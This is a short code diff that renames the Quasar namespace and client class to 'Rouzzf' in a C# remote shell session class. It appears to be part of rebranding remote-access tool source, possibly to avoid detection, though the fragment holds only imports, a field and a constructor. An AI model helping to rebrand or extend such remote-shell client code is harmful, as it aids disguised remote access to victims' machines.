@@ -1,5 +1,5 @@
-﻿using Quasar.Client.Networking;
-using Quasar.Common.Messages;
+﻿using Rouzzf.Client.Networking;
+using Rouzzf.Common.Messages;
 using System;
 using System.Diagnostics;
 using System.Globalization;
@@ -7,7 +7,7 @@ using System.IO;
 using System.Text;
 using System.Threading;
 
-namespace Quasar.Client.IO
+namespace Rouzzf.Client.IO
 {
     /// <summary>
     /// This class manages a remote shell session.
@@ -50,13 +50,13 @@ namespace Quasar.Client.IO
         /// <summary>
         /// The client to sends responses to.
         /// </summary>
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="Shell"/> class using a given client.
         /// </summary>
         /// <param name="client">The client to send shell responses to.</param>
-        public Shell(QuasarClient client)
+        public Shell(RouzzfClient client)
         {
             _client = client;
         }
